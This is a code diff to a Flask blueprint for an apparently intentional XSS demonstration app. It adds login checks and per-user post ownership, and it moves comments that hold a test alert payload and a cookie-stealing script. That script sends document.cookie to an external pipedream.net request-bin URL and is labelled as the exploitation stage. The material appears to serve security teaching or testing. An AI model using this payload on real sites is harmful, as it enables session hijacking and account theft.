@@ -1,7 +1,7 @@
 from logging import getLogger
 from flask.views import MethodView
-from flask import Blueprint, render_template, url_for, redirect, jsonify, request
-from flask_security import current_user
+from flask import Blueprint, render_template, url_for, redirect, jsonify
+from flask_security import current_user, login_required
 from blueprints.forms import PostForm
 
 
@@ -21,23 +21,29 @@ class XSSDemostration(MethodView):
 
     methods = ['GET']
     
+    @login_required
     def get(self):
         post_form = PostForm()
         comments = Post.get_all() or []
         return render_template("broken_comments.html", form = post_form, comments = comments)
 
+# Тестировщик Владислав
+# Тест <script>alert("XSS IS REAL?")</script>
+
+# Этап эксплуатации
+# XSS DEMONSTRATION <script> var i=new Image(); i.src="https://enm3vddkwx8b.x.pipedream.net/?"+document.cookie; </script>
+
 class XSSPost(MethodView):
 
     methods = ['POST']
-
-    """
-    XSS) <script>var i=new Image;i.src="https://enm3vddkwx8b.x.pipedream.net/?"+document.cookie;</script>
-    """
     
+    @login_required
     def post(self):
         post_form = PostForm()
         if post_form.validate_on_submit():
-            post = Post(**post_form.to_dict())
+            data = post_form.to_dict()
+            data['user_id'] = current_user.id
+            post = Post(**data)
             post.save_to_db()
         return redirect(url_for('xss.xss_index'))
     
@@ -50,8 +56,9 @@ class XSSPostDelete(MethodView):
         can't use http delete method ;c
     """
 
+    @login_required
     def post(self):
-        Post.remove_all()
+        Post.remove_all_by_user_id(user_id= current_user.id)
         return redirect(url_for('xss.xss_index'))
 
 class XSSCheck(MethodView):
